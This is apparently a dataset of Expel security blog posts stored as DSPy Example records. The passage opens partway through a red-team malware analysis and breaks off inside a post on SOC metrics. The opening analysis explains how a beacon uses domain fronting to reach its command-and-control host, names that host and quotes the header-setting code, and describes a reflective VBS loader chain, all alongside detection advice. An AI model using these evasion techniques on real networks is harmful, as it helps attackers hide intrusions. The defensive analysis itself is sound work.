dropper_cs listmodules Following the program logic reveals what is actually going on with the DNS resolution of paypal.com  domain fronting. Domain fronting leverages the way content delivery networks work in order to mask the true destination domain of an external network communication by operating at the application level. The DNS resolution and initial communication setup occurs for the high-reputation domain, while the host header  the true destination  is then set to the attacker controlled domain located on the same CDN. Domain Fronting Source: Domain Fronting in a nutshell by Rukavitsya The dropper_cs payload beacon was configured to appear to be communicating with paypal.com, which is set in the baseURL and address strings. After the initial DNS resolution, web requests for the beacon will actually end up being routed to update-crl.azureedge.net by setting this as the HTTP host header value with webClient.Headers.Add(Host,str) . dropper_cs Domain Fronting Related Code 1 dropper_cs Domain Fronting Related Code 2 Based on CDN reporting tools, https://www.paypal.com:443 would resolve to the Akamai CDN. While the azuredge.net subdomain is located on the Microsoft Azure infrastructure, Azure provides the option to select from a number of top CDNs, including Akamai. CDN Report for paypal.com The layers of obfuscation contained in settings.vbs were worked through in order to reveal its true nature. None of the PE files and shellcode encapsulated in the vbs file ever hit the hard-drive, but rather are reflectively loaded into the script host process memory. The end result of our analysis gives us the source of the beacon payload and the real c2 domain. Settings.vbs &gt; uqatarcu.dll (32/64 bit branch) &gt; SharpRunner.dll (other ShellCode in Memory Space) &gt; dropper_cs.exe Insights from this malware examination Like I mentioned in the beginning of this post  its important to come out of red team engagements having learned something new that can help our customers in real life. Heres what I learned after exercising my detective muscles and untangling malware code in this simulation: Malware analysis takes persistence to peel back the layers Reaching the core of a malicious payload can provide invaluable insight With the right CDN, domain fronting is still a viable option for malicious actors Were working on another blog post that explores a suspicious login case study, so stay tuned for our upcoming content. Until then, check out our other blog posts for more lessons learned from alert investigations. A note about domain fronting Domain fronting is dependent on having both a domain on the same CDN as the domain its masking as, and the domain fronting technique being possible on the CDN. While Google and Amazon have shut down the ability to perform domain fronting on their CDN services, this technique still works on Azure and other platforms. Domain fronting is not only leveraged by hackers to help blend-in inside a company network, but also used by non-malicious internet users to bypass Internet censorship. There is an argument that keeping it available is essential for Internet Freedom ( Domain Fronting Is Critical to the Open Web ). Time will tell if domain fronting remains an option for those with malicious and non-malicious intentions, but companies worried about it being used by malicious actors to help hide in their networks arent powerless to detect it. Domain fronting can be detected by comparing the host field of the HTTP header with the HTTPS SNI field of the web request. This process will require SSL inspection, which is the ability to view the encrypted HTTP data, or a next-gen firewall product that directly provides this detection.'}) (input_keys={'title'}),
  Example({'title': 'Office 365 security best practices: five things to do right ...', 'url': 'https://expel.com/blog/office-365-five-things-to-keep-attackers-out/', 'date': 'Jan 15, 2019', 'contents': 'Subscribe  EXPEL BLOG Office 365 security best practices: five things to do right now to keep attackers out Security operations  3 MIN READ  DAN WHALEN  JAN 15, 2019  TAGS: Cloud security / How to / Selecting tech Figuring out what you should do to protect your SaaS infrastructure like Office 365  especially if youre newer to cloud  can feel overwhelming. After all, your users over in sales, marketing or R&amp;D probably arent going to think twice about how strong their passwords are, or notice the cleverly disguised phishing scam that just landed in their inboxes. We get it. And youre not alone if youre kinda freaking out: According to the PhishLabs 2018 Phishing Trends and Intelligence Report , attacks targeting SaaS applications exploded last year, growing by more than 237 percent. SaaS-based applications: a cloudier view of your data Things like email, word processing and document sharing tools are ubiquitous. This makes them prime targets for attackers. Long gone are the days when IT ran their own email servers. Today, SaaS-based applications like Microsoft Office 365 offer lots of convenience and cost savings  but since they operate in the cloud , it also means your former front row seats to your data and infrastructure now come with a slightly obstructed view. While cloud providers like Amazon Web Services, Microsoft Azure and Google are responsible for securing their infrastructure, the bottom line is that your organization is still responsible for protecting your companys data  whether youve only got one app in the cloud or youve moved all of your apps and data up there. (Psst: If your cloud security strategy needs a tune-up, you wont want to miss this post .) No matter where you are in your cloud journey, if you run Office 365 here are five important things you can do right away to keep attackers (and wiley insider threats) at bay. What do I need to do to keep Office 365 secure? If youre running Microsoft Office 365, there are five Office 365 security best practices youll want to check out right now to keep your org and your data safe: Enable audit logging . This is one of the most impactful things you can do when it comes to securing Office 365. Why? Office 365 audit logs record all activities across Office 365 apps. When an incident occurs, this makes it a lot easier to investigate because youve got access to all the actions users took in Office 365, ranging from viewing and downloading documents to resetting passwords. Heres a full list of the actions that Office 365 audit logs record, and instructions for turning on audit logging . Use multi-factor authentication everywhere. Multi-factor authentication is a lot like building a fence around the perimeter of your house (or data, in this case) to deter bad actors. It shrinks your risk of falling victim to the most common attacks like simple phishing and password spraying. Phishing is still one of the top initial attack methods of choice . For instance, take a look at this example of a crafty phishing campaign that hid malicious URLs in SharePoint files. Implement controls to stop the most common things attackers and users do. Look for security controls that address issues like phishing prevention, malware scanning, user behavior analytics and DLP scanning. Depending on your organization, this could mean implementing native Office 365 security tools , or exploring third-party options. Tighten up your Office 365 policy configurations. Microsoft offers good advice on ways to better secure your data in Office 365. Based on the Office 365-related incidents the Expel team has investigated and resolved for our customers, we recommend that, at a minimum, you review your organizations conditional access policies, restrict or disable public SharePoint and OneDrive links and disable mailbox forwarding. Plan ahead for account compromises  theyre inevitable. Not to be all doom and gloom over here, but as anyone in security knows, its always wise to prepare for the worst. Know that when an incident occurs, investigations are probably different than the good ol days when you had your email server tucked away safely in your server room. For starters, there arent any endpoints or network devices to review. Also absent are files, processes and network traffic  all of which helped us determine the scope and impact of an intrusion in the past. Instead, SaaS incident investigations rely heavily on audit logs (see best practice #1) that are user-centric because they can help us determine whats normal or abnormal for a particular users account. What location does the user normally authenticate from, and what device does he or she normally use? What actions does he or she take after logging into the account? To answer these questions, youll need to be familiar with Office 365 audit logs. Last but not least, keep our handy cheat sheet for managing your next security incident nearby (and give a copy to every team member!). Still have questions? Want to learn more about Office 365 security in the cloud? Get in touch  wed love to help.'}) (input_keys={'title'}),
  Example({'title': "Our approach to building Expel's Phishing team", 'url': 'https://expel.com/blog/our-approach-to-phishing-team/', 'date': 'Nov 8, 2021', 'contents': 'Subscribe  EXPEL BLOG A new way to recruit: Our approach to building Expels Phishing team Security operations  8 MIN READ  BEN BRIGIDA, RAY PUGH, DESHAWN LUU AND HIRANYA MIR  NOV 8, 2021  TAGS: Careers / Phishing A lot of companies are experiencing a brain drain in whats being called the Great Resignation. Its a pain that security teams know all too well. You hire great people who have the skills you need, they get familiar with your environment, and thentheyve already moved on to their next job. Youre happy for them. But now youre back to the beginning. Is there a solution? Weve written blog posts about how optimizing the human moment helps us not only create greater efficiencies in our operations, but also helps us prevent analyst burnout while giving them meaningful work. Optimizing for the human moment here at Expel means letting tech handle the work that can be automated  think decision support, enrichment and automation of repetitive tasks that increase cognitive load (i.e. the things that cause analyst burnout)  so our crew has the time and space to shine in the moments when a human eye is required. Fun fact: the initial beta of Expels phishing service was built in a Jupyter notebook written by one of our security operations center (SOC) analysts. Hes now one of our detection and response (D&amp;R) engineers. Creating space for people to do what they love is at the core of why we do what we do. We do it for our customers and its important to us that we also do it for our Expletives. So we asked ourselves: how do we build a service and training program thats accessible to folks early on in their security career journey? We discovered that part of the answer is in widening the pool for recruitment by focusing on traits, not skills. Allow us to explain. The Expel Phishing team is one of our newest teams, and recruiting for that team created an opportunity for us to experiment with this approach. So we set out to hire for the traits that are important for these roles (curiosity, candor, passion for learning, desire to help others, drive and attention to detail), knowing we could then teach our new team members the skills they need to be successful. In this blog post, well share how were using the Expel Phishing team and its simple, narrow focus, to achieve two goals: Protect managed detection and response (MDR) service continuity Increase diversity in cybersecurity At the end of this post, youll also hear from some of our newest Expel Phishing team recruits. Theyll share their stories and what its like to be a new member of the team. The Expel Phishing team Phishing is still the top threat facing most orgs. In fact, business email compromise (BEC) attacks made up 61 percent of the critical incidents Expels security operations center (SOC) responded to in September. Knowing that phishing isnt only going to remain a top threat but that tactics will also continue to evolve, the Expel Phishing team was created in partnership with our customers. They had a need and we knew how to help. The initial team was a temporary experiment. After finding success during the research and development phase, we decided to pull in some of our other customers to beta test the service and see if we could run it on a larger scale. The beta test was a success and we introduced Expels managed phishing service. The Expel Phishing team functions as a cost-effective bench for our managed detection and response (MDR) service. We expect a lot of our MDR analysts  providing world-class service against every bad actor on the internet on a staggering number of technologies and attack surface areas, in a transparent platform, while also communicating the findings directly to our customers in Slack. No pressure, right? Weve got their backs, just like weve got our customers backs. Protecting MDR service continuity Finding people who can provide that kind of MDR service on even one of our service offerings is difficult at an entry-level position. This means we have to spend time teaching our analysts what attackers do on roughly everything and how to use the Expel Workbench to update customers about our work in real-time. Its a lot to learn, and it takes a while. On the other hand, because phishing has a much narrower scope, phishing analysts can focus on learning to find attackers in one threat vector (emails) and how to use the Expel Workbench to do so. Then they can communicate their findings to our customers. Through this learning process, theyre also interwoven into the MDR service (think our SOCs always-open Zoom room, chats and meetings) so they see the MDR operational tempo and texture. As a result, phishing analysts focus on emails but also get exposure to more attack surfaces over time. So when there is an opening on the MDR team, phishing analysts can slot in and rapidly provide value because theyve effectively been in MDR training for their whole time on the phishing team. Because of these dual levels of exposure, we can draw out the learning timeline and have a lower technical threshold for recruiting phishing analysts because we can teach them how to do security at the MDR level while they initially provide value to phishing customers. As a result, weve found that analysts who transition to the MDR service from the phishing team have a significantly greater familiarity with our customers, internal processes and the investigative methodology/analyst mindset we use  which they can put to use right away. Our phishing to MDR pipeline enables analysts to join our SOC even if theyre new to the industry, gives them space to build additional skills and experience and our customers benefit from having them stay here as they continue to grow and have a clear path for career progression. Increasing diversity in cybersecurity This brings us to our second goal: increasing diversity in security. There are plenty of high-performing people looking to get into security. And a complex service offering has traditionally required either hiring people who have extensive experience in the field so they can perform the job now, or a lengthy onboarding period where a less experienced analyst is learning and having to produce under high expectations and pressure. Not only does this make it difficult to hire  its one of the many driving forces behind the lack of diversity in our field. The barriers to entry for underrepresented groups in tech (and other industries) result in a lot of terrible things. And one of those is limited opportunities for people from underrepresented backgrounds to gain the years of experience that so many security jobs require. Bringing on someone who doesnt have the skills or knowledge to perform at the expected level impacts margins and puts the person in a bad spot for their mental well-being and likelihood of success. So we designed our hiring process with simple enough technical requirements and we focus almost exclusively on the traits of the people were hiring. These are important traits thatll help them be successful in the role while we teach them the hard skills theyll need to do the job. This hiring strategy dramatically increases the pool of potential candidates who have the enthusiasm and willingness to learn but maybe havent yet been given the opportunity they need to learn some hard skills. It lets us hire folks much earlier in their security journey and set them up for success. Entering a new industry, and particularly security work, can be intimidating. So we start by teaching our new phishing analysts technical fundamentals for a niche area of expertise. This foundation allows them to grow and expand as theyre ready, and we tailor our approach to each individual based on their skills, strengths, growth areas, goals and personal life. Maintaining balance for each of our analysts is key. We get to provide them with a potentially life-changing opportunity to enter the field and learn the skills theyll need to succeed while they get to help our customers stay ahead of emerging threats. In a rapidly changing global landscape, we need to make sure were prepared to quickly adapt. This doesnt just mean building new capabilities and building automations that continuously increase efficiency. It means planning for personal leave for both planned and unforeseen circumstances so our team can take the time they need to recharge while making sure that we never skip a beat. We also need to account for promotions, job changes and training time for new analysts. And we make sure that if an analyst leaves the team for one reason or another, were still resourced to continue providing the same high-quality service our customers expect. This is thanks to our streamlined initial training that gets new hires combat-ready in just a few weeks. We also prioritize getting to know and staying in touch with folks who we believe will be a good fit for the team, even if we dont immediately have a job opening for them. That way, when a position becomes available, we can reach out and find someone ready to enthusiastically step into the role. Widening the talent pool Our approach to hiring and training our phishing team has already paid dividends. Weve promoted multiple analysts from our Expel Phishing team into our MDR service. And theyve stepped in and provided Expel MDR-level service in just two weeks. In May 2021, our phishing service became part of our 247 operations. Since going 247, weve seen a 500 percent increase in email submissions. And our crew transitioned seamlessly. With equity at the forefront of our minds, were also excited about the incredibly talented people whove joined our team. So far, 31 percent of our phishing team hires are women and 44 percent are people of color. And by working in close collaboration with our Equity, Inclusion and Diversity (EID) leads, we plan to continue widening our talent pool to bring on the best of the best from different backgrounds and experiences. We know a focus on EID initiatives will help us create the strongest team. Meet some of the crew So, hows it going for our new Expletives on Expels Phishing team? Heres what theyre saying: I was so burnt out on applying for positions and going through lengthy interview processes that I was having major anxiety. Expels recruiter, Neiko, picked up on that immediately and went into how can I help mode. This was my first major indicator that maybe Expel wasnt like any other company. We talked, rescheduled and thankfully two weeks later I was presented with an offer. I never could have imagined the trajectory my career has taken in such a short amount of time, but thats the thing with Expel  anything is possible!! From day one, my team lead was proactive in asking about and helping me develop some career goals. I definitely credit our weekly 1:1s as well as my growing responsibilities as a huge catalyst for me learning new things and strengthening my skill set. Coupled with the fact that you are surrounded by like-minded individuals who love what they do and are passionate about cybersecurity, you have a recipe for success. Both my team lead and senior analysts helped me thrive. From a junior phishing analyst to associate MDR analyst, cheers to an environment that fosters real growth! Stacey Lokey , associate MDR analyst Breaking into the cybersecurity industry is not an easy task. Be prepared to edit your resume, prepare for interviews and just keep pushing ahead after hearing no. Even when one does break into the industry, landing in an environment that is positive and actively promotes ones growth is like finding a needle in a haystack. Then theres Expel, a company that not only looks for entry-level analysts but also provides a pipeline to become a career-level analyst. My experience with Expel was the dictionary definition of seamless. After speaking with the hiring managers and hearing many of their journeys to the security field, I knew I wanted to join the team. At Expel, it wasnt only about the technical expertise of the industry but about who you are as a person and relatable skills that successful analysts tend to possess. Dom Bryant , SOC security specialist My experience as a junior SOC analyst on the Phishing team greatly prepared me for a role on the MDR team. Working on malicious email submissions and BEC activity provided a great foundation for working on the bad (one of my favorite parts of the job). Additionally, although I was on the phishing team, our SOC is one team as a whole. It was because of this that I was able to gain exposure to MDR alerts, processes, incidents and even get some hands-on experience with the help of other team members. All of this experience led to me feeling much more calm and confident when transitioning to the MDR team. Tucker Moran , associate detection &amp; response analyst Starting out as a member of the phishing team allowed me to focus on a single alert type while getting familiar with all of the technology that Expel has access to, as well as the various customers we support. This experience allowed me to focus on developing my analyst skill set, while figuring out my personal process for triaging alerts. Given a few months in this role, I became comfortable with taking the next step over to MDR where we handle a much larger variety of alert types. While it can certainly be done, it was a much less overwhelming transition being comfortable with the different technology and processes before making the jump. Kayla Cummings, associate detection &amp; response analyst Interested in joining our crew? Wed love to hear from you !'}) (input_keys={'title'}),
  Example({'title': 'Our journey to JupyterHub and beyond', 'url': 'https://expel.com/blog/our-journey-jupyterhub-beyond/', 'date': 'Sep 3, 2019', 'contents': "Subscribe  EXPEL BLOG Our journey to JupyterHub and beyond Security operations  8 MIN READ  PETER SILBERMAN  SEP 3, 2019  TAGS: Get technical / How to / Managed detection and response / Planning / SOC If youre like us and you do technical research in a team, youve likely run into a set of canonical problems. For example: Youre looking at some amazing graphs done by someone whos on vacation (or doesnt work here anymore) and have no idea how they were generated. Youre looking at python code that implements a formula from a paper, but you cant understand if thats a matrix multiplication or a typo. Sound familiar? Weve found several tools that help us solve these kinds of challenges. Chief among them is Jupyter Notebooks. If you arent familiar, Jupyter Notebooks offers an open-source web application that allows you to create and share documents that contain live code, equations, visualizations and narrative text. The (very few) pitfalls of Jupyter Notebooks Although notebooks are a great tool, we started running into a few bumps as soon we started to scale them across several teams. Here are some of the challenges we faced: Keeping content up to date was a pain and required all authors of notebooks to also know how to use git. Sharing research projects with different employees and teams required us to send notebooks via Slack or other means. Sharing notebooks from one user to another didnt always work due to package dependencies that one user had that another user didnt. Data sprawl was challenging  data was on employee laptops, couldnt easily be shared and would eventually need to be deleted by the employee. Managing credentials and API keys for each notebook wasnt convenient. There wasnt an easy way to productionize a notebook  meaning we couldnt take a notebook that solved a problem for our operations team and make it available to everyone without sending it to them all or having them check out the notebook locally, install all dependencies and run the notebook when they wanted to use it. The good news, though, is that there are plenty of other tech teams that use notebooks, along with data science companies that help other orgs solve challenges just like these. So we looked into how Netflix uses notebooks ( Beyond Interactive: Notebook Innovation at Netflix , Part 2: Scheduling Notebooks at Netflix ). We even tried deploying AirBnBs Knowledge Repo. We looked at a couple data science platforms but quickly discovered that wed only need to use a small subset of their features so we couldnt justify the high cost. TL;DR: Our team loved Jupyter Notebooks but needed a more centralized model to make them work effectively across our company. JupyterHub saves the day After doing some additional research, we discovered JupyterHub. And it was exactly what we were looking for to help our notebook scale. Whats JupyterHub, exactly? The JupyterHub website says it best: JupyterHub brings the power of notebooks to groups of users. It gives users access to computational environments and resources without burdening the users with installation and maintenance tasks. Users  including students, researchers, and data scientists  can get their work done in their own workspaces on shared resources which can be managed efficiently by system administrators. JupyterHub runs in the cloud or on your own hardware, and makes it possible to serve a pre-configured data science environment to any user in the world. It is customizable and scalable, and is suitable for small and large teams, academic courses, and large-scale infrastructure. In security nerd speak, JupyterHub creates a multi-user server where each user kernel is an isolated python process. This means that two users can run the same notebook with different input parameters and get different results  and that capability alone solves several of our problems. Benefits of centralizing notebooks using JupyterHub After setting up JupyterHub (more on that in a minute), we quickly discovered lots of benefits of centralizing our teams notebooks: Notebooks are accessible across the org by default, which meant we didnt have to send .ipynb files back and forth. End users dont have to worry about keeping their content up to date in a GitHub repo  because users are doing their work in JupyterHub, notebooks are always up to date. Everyone uses the same environment with JupyterHub, which reduces the chances of the team running into dependency issues. Theres no need to store data on employee laptops, which means you know where your customers data is at all times. We provide a convenient way for users to leverage API keys and user credentials. We can productionize a notebook simply by having a directory hierarchy that supports the notion of supported notebooks that are versioned (more on this later). This means we dont have to Slack users about updates to notebooks. Instead we can upgrade the notebook theyre using on our central server. We centrally manage and monitor usage to keep customer data safe. How to set up JupyterHub When we build new infrastructure here at Expel or start to use new platforms, we always try to reuse previously defined engineering processes. In this case, we already use CircleCI for CI, GitHub for revision control and Ansible / Terraform for infrastructure management/deployment. We decided that using these existing tools and processes would make it easier to manage and scale the service over the long term (and itll keep our Site Reliability Engineers (SREs) happy). Using our existing tools and processes also means we can easily manage packages, control versions of productionized notebooks and more. We also knew that for notebooks that were used by more than a few people, we should version those so that if something goes wrong we can easily roll them back. So our JupyterHub setup looks like this: We stood up our JupyterHub environment in Google Cloud Platform, but you could easily follow a similar workflow as shown above if youre using Microsoft Azure or Amazon Web Services or even setting this up on prem. JupyterHub (to its credit) has a lot of configuration options. These are accessible through jupyterhub_config.py . Its somewhat overwhelming how much you can configure. To make it easier for you to wade through the many options, well share a couple of the configuration options that we tweaked and why. Authentication JupyterHub has amazing support for various authentication mechanisms. Thats great for us. We choose to use OAuth which allows us to enforce multi-factor authentication but also gives Expel employees easy access. Default URL Using the default URL setting, we built a landing page which allowed new users to get up to speed faster. In practice, all we had to do was add this line of code within the JupyterHub configuration: c.Spawner.default_url = '/notebooks/Welcome.ipynb' This configuration forces a redirect when users log into a specific page. In our case the page provided new users with a set of getting started tips including rules of the road  telling folks who are new what not to do (storing passwords and auth tokens in notebooks, for instance) to help them get off on the right foot. Even better, we provide examples of how to do those things correctly. Landing page We customized our landing page for JupyterHub Notebooks, and created a list of FAQs to address some of the questions our initial devs got used to answering. Heres a screenshot of our welcome page: Getting Started / Example notebooks: We have example notebooks that show how to log into our system and access data, and we also have example notebooks that access DataDog and other common services. Notebook header guidelines: We want to have some consistency in our notebooks so we ask users to follow a very simple template pattern so that its easy to understand what the purpose of the notebook is etc. Below is the markdown we recommend Expel employees use when creating a new notebook: # Notebook Name ## Purpose What are you trying to do with this notebook? ## Audience Who is this notebook developed for? ## Data Sources * Data source 1 * Data source 2 ## Description (How does it work?) 1. Step 1 2. Step 2 3. Step 3  ## Parameters Parameter | Description  |  PARAM_1 | Blah blah PARAM_2 | Blah blah ## References * Links to documentation or external references Environmental Variables We decided early on to make accessing various services as easy as accessing a list of defined environmental variables. We set all of our environmental variables via c.Spawner.environment which allows each instance of a notebook to have the same environmental variables. This way if a user wants to pull metrics from DataDog he doesnt have to generate his own API/APP key and instead can use the one on JupyterHub. The same is true for other services. More JupyterHub tips and tricks Once youve got JupyterHub up and running, its easy to perform simple tasks related to notebooks, like deploying new ones or managing notebook content. Here are a couple tricks we learned along our JupyterHub journey that might be helpful as youre getting JupyterHub set up in your own org. How to deploy new JupyterHub notebooks Weve gotten a lot of mileage out of applying some DevOps patterns to our JupyterHub deployment. As an example, we were able to leverage the github template repos to build a notebook template. This allows a new user to click a few buttons and have all the boiler-plate for running a notebook in our environment without having to cut-and-paste anything. This mirrors what weve done in our product development, where weve built out templates for services in Golang, Python and Node.js. We decided to create a templatenotebook repo (see the image above) to make it easy for authors to move and manage specific notebooks in GitHub. The CircleCI process I talked about earlier that kicks off builds an RPM with the notebook and the tagged version. This allows authors to version notebooks for deployment and allows us to roll them back if we accidentally introduce a bug. How to adjust filesystem permissions in JupyterHub One challenge we knew we needed to solve (and hoped JupyterHub could help) was to effectively manage notebook content on the filesystem in a way that allowed users to safely read and execute each others notebooks. In order to do this, we tied unix groups and filesystem permissions together with our OAuth integration. Each new user is automatically added to a developer group that has read and execute privileges on all other home directories. This allows our analysts to run notebooks from other users, but not modify them. If a notebook is deemed operationally important, well move it out of a users home directory, create a GitHub repo to manage the check-ins, tag releases of the notebook that built RPMs and then deploy those RPMs and install the notebook to a specific directory (that is read-only and execute for all users). Then other team members can bookmark the location. To make sure we dont lose our work, we run daily back ups and retain them for 14 days. Our experience with JupyterHub (so far) In just the few months weve had JupyterHub operationalized, weve seen awesome adoption among employees. Almost 100% of Expel employees who work with customers  that is everyone from our SOC analysts to our customer success team  has logged into the server at some point. Weve seen an uptick in notebook creation, with 170 unique notebooks created in approximately two months time on JupyterHub versus the 15 notebooks previously checked into GitHub. Up next for our use of JupyterHub at Expel is to be able to schedule the parameterized run of a set of notebooks. Were looking into using papermill or paperboy for this. In addition, as we move our production infrastructure to Kubernetes, were looking to tightly integrate that, allowing users to run Kernels inside our Kubernetes infrastructure. If youre looking for ways to make research more accessible and easier to manage among your team(s), check out JupyterHub. Even if you dont have much experience with it, JupyterHubs documentation makes it easy for anyone to get up and running in no time. In the coming months well be releasing a few more blog posts that talk about specific use cases for JupyterHub  everything from using it for hunting decision support to how were using JupyterHub for tuning detection thresholds. A huge thank you to Justin Willis and Reilly Herrewig-Pope on our infrastructure team. They were instrumental in helping configure, stand up and figure out how best to manage JupyterHub and our notebooks. Additionally, Id like to thank Andrew Pritchett and Brandon Dossantos for not being happy with the status quo of notebooks + GitHub."}) (input_keys={'title'}),
  Example({'title': 'Performance metrics, part 1: Measuring SOC efficiency', 'url': 'https://expel.com/blog/performance-metrics-measuring-soc-efficiency/', 'date': 'Sep 29, 2020', 'contents': 'Subscribe  EXPEL BLOG Performance metrics, part 1: Measuring SOC efficiency Security operations  10 MIN READ  JON HENCINSKI, ELISABETH WEBER AND MOR KENANE  SEP 29, 2020  TAGS: MDR / Metrics / SOC A head of a SOC team, an analytics engineer and a data scientist walk into a bar (or a Zoom chat nowadays)  Okay, so maybe it wasnt a bar, but we did come together to chat about metrics. The result is this three-part blog series. Thats right  three blog posts! Its hard to cover all things SOC efficiency and leadership in just one post. And given that weve been receiving a lot of questions around SOC metrics, we thought it would be helpful to spend some time defining what we mean by SOC metrics and how they are used to make sure our customers  and our team!  remain happy. The truth is: a lot of SOC burnout is the result of ineffective operations management. A SOC can be a great place to work. At Expel, metrics are more than measurements. Metrics help us take care of the team. Heres what well cover: In this first post, well share our thoughts on how to set up a measurement framework that helps SOC leads ensure goals are being met (and when theyre not). The second post will dive in a little deeper to explore how to avoid burnout by guarding the system against volatility. In our final post, well share some IRL examples and what we did to achieve our aim. What are cybersecurity metrics, and why do we need them? Setting up a way to measure success is important to making sure you have an effective SOC . The way we see it, great leaders organize their teams around a compelling goal (or aim), arm the team with the right metrics to inform where they are in the journey and then get out of the way. Theres no more strategic thing than defining where you want to get to and measuring it. Strategy informs what great means and measurements tell you if youre there or not. In this post, were going to discuss how to create a strategy with a clear aim, share the metrics we use here at Expel to measure the efficiency of our SOC, along with each team members unique perspective on why these measurements work. After hearing from our team, youll be able to apply our approach as you establish goals for your own SOC. Create your cybersecurity metrics strategy A strategy starts with a compelling aim. To keep it simple: Goals are things you want, strategy is how youre going to get there and measurements tell you where you are in that journey. If you dont have an aim you might fall into the trap of measuring just to measure and the result could be a lot of work with no progress. Lets say you have your compelling aim of where you want to get to. You know what you want to measure. But do you have the data you need to measure? Before you can create great metrics you need to start with good, reliable data. So where should you get that data? In our case, our SOC analysts use a platform called Expel Workbench to perform alert triage, launch investigations and chase bad guys. We track a lot of the analyst activity and the data from that activity is accessible to us through our APIs. Through those APIs we can pull info like arrival time of an alert, the time when an analyst started looking at an alert, when an analyst closed an alert and more. Its important to note that while sometimes its certainly okay to start by measuring the data you have available, we recommend that you understand what you want to measure (informed by your strategy) and invest the time, effort and energy in making that data available. To build, maintain and scale the Expel SOC we set clear aims, arm the team with Jupyter Notebooks , use data for learning and then iterate. Heres our formula for success: Clear aims + ownership of the problem + data for learning + persistence = success Define your goals These are the aims we identified for the Expel SOC: Has a firm handle around capacity: We know how much total analyst capacity we have, what the loading was for any given day or month, and were able to forecast what loading will look like in the future based on our anticipated customer count. This will tell us how were going to scale. Responds faster than delivery pizza: Thirty minutes or less to spot an incident and provide our customers steps on how to fix the problem. Improves wait times: Almost everything we touch in our SOC is latency sensitive. Wait times should improve. Improves throughput: If were performing the same set of analyst workflows again and again, lets identify that and automate the repetitive tasks using our robots. Measures quality: Has a self-correcting process in place and finds opportunities for improvements and automation. Now that weve shared our goals, lets talk about metrics. Develop cybersecurity metrics Next were going to walk you through three metrics we think are fundamental to managing a SOC: When do alerts show up? (alert seasonality) How long do alerts wait before a robot or an analyst attends to them? (alert latency) How long does it take to go from alert to fix? (remediation cycle time) These metrics are key to measuring efficiency because they tell you when work shows up, how long work waits and how well the system is performing. W. Edwards Deming once said, Every system is perfectly designed to get the result that it does. If were slow to respond to alerts or incidents (30 minutes or less in our SOC), we know theres a flaw in the system. These three metrics help us understand how were performing. For each measurement, well provide our perspectives on why we measure (from Jon, Expels SOC lead) and how we build and optimize those measurements (from Elisabeth , Expels data scientist, and Mor, Expels analytics engineer). Metric #1: When do alerts show up? Jons perspective: If we go back to our aim, we know that to build a highly effective SOC ( especially now that were remote ) we need to have a firm handle around capacity and utilization. I need to know when alerts show up. That informs when folks on the team show up to work. If theres more loading in the morning, Ill make sure we have more analysts on shift in the beginning of the day. If we add a customer in an international time zone, Ill monitor and make sure the time when alerts show up doesnt change. If it does, Ill adjust when folks show up to work. Elisabeths perspective: To figure out when work shows up, we started with some really basic metrics and then worked our way up to more complicated seasonality decomposition and capacity modeling (more to come in a future post). We started by simply looking at the median hourly alert count. Using this metric, we see at what times of day our volume spikes the most, and in turn, when we need to staff the most analysts. This is something we continue to track over time, and as you can see in the graph below, the pattern changed. The blue line shows the hourly counts for October 2019, the orange line shows the hourly counts for March 2020 and the green line shows hourly counts for July 2020. October data peaked between 10 a.m. and 4-5 p.m. ET. However, by March we started to see that line flatten a little and this trend continued into July. As weve added more West Coast and international customers, our load became more consistent throughout the day. Median Hourly Alert Count in October 2019 vs. March 2020 vs. July 2020 We saw this shift happening thanks to the fact that we use alert seasonality as a metric. As a result, we were able to proactively staff more analysts later into the day to avoid any overload. Metric #2: How long do alerts wait? Jons perspective: Almost everything we do in our SOC is latency sensitive. The longer an alert waits, the potential for downstream damage to a customer increases. Alert seasonality tells me when work shows up but alert latency tells me how quickly were able to pick up work as it enters the system. If alerts latency times are high this tells me one of three things is happening: we dont have enough capacity to keep up, were spending too much time chasing bad leads or were over subscribed responding to incidents. The key here is to set wait time goals  you may call these Service Level Objectives (SLOs)  then monitor and adjust. You dont want to tune to your relative capacity here. The trick is to find where you can use technology and automation to hit your targets and make this easy on the team. Mors perspective: Alert latency is a fairly simple calculation. We measure the time between two timestamps: The time an alert entered the queue; and The time when that same alert was first actioned. If an alert entered the queue at 11 a.m. ET and the first action was performed 20 minutes later, the alert latency is 20 minutes. We measure alert latency for every alert that enters the queue to understand how long alerts are waiting and if were within tolerance of our SLOs. Alert latency is important within the context of SOC operations. If youre considering setting an aim to pick up alerts fast  consider these two key factors. Measure the 95th percentile  not the median: At Expel, when measuring alert latency, we use the 95th percentile. So in essence, our metric helps us understand how long alerts wait before first action 95 percent of the time. If we were to use the median latency, thatd only tell us how long alerts wait 50 percent of the time. In doing so we may think were more effective than we really are. Bottom line: Use the 95th percentile or higher to understand alert latency. Not all alerts are created equal: Alerts show up with different severities. Each severity has a different SLO. At Expel an alert can be labeled with one of five different severities: Critical High Medium Low Tuning The easiest way to think about severity is confidence + impact = severity . If Im confident that when an alert fires it will be a true positive AND it will lead to really bad outcomes for a customer, the alert will be labeled with a critical severity. Well set an SLO that our SOC will pick those up within five minutes. The SLOs increase in time as we become less confident that the alert will be a true positive. When I built this metric understanding that I needed to slice and dice on alert severity was super important. We track alert latency weekly and monthly broken out by severity. When we review alert latency as part of our weekly check, well record our performance in a simple table (like the one below): Alert Latency Alert Severity SLO 95th % Critical 5 minutes [font_awesome icon=check] High 15 minutes [font_awesome icon=check] Medium 2 hours [font_awesome icon=check] Low 6 hours [font_awesome icon=check] Tuning 12 hours [font_awesome icon=check] Alert latency table When reviewing alert latency on a month-to-month basis, trending out performance in a time series distributed by severity allows us to spot performance issues. For example, if our SLO times for low severity alerts start to increase, we know if we dont act well likely see our medium, high and critical SLO times degrade. Our lower severity SLO times act as a leading indicator. The key is to monitor and adjust. Alert latency time series summarized monthly broken out by severity Jons perspective: To amplify what Mor said, if I see SLO times for low, and tuning alerts trend in the wrong way (things are taking too much time), I know we need to act now or SLOs for &gt;=medium severity will degrade over time. As Mor said, the key is to monitor and adjust. And by adjust I dont mean tell the team to work faster. Never do this. You need to understand the work thats showing up, optimize detections, tune and apply filters where needed and automate. We wrote a blog post on how our SOC analysts use automation to triage alerts, in case youre interested in learning more about how that process plays out. Metric #3: How long does it take to go from alert to fix? Jons perspective: This is another measurement focused on time. Remediation cycle time is the time it takes a SOC analyst to pick up an alert, declare an incident, orient and provide remediation actions to our customers. I believe that speed matters when dealing with an incident and measuring alert-to-fix times is a good way to understand SOC performance. In fact, we provide this metric in every incident Findings report to our customers. Alert-to-fix timeline  included with every Expel incident Findings report We review alert-to-fix times weekly and anytime we dont meet our mark of 30 minutes or less, we take a look at an incident and find ways to improve. Its data for learning. You may be 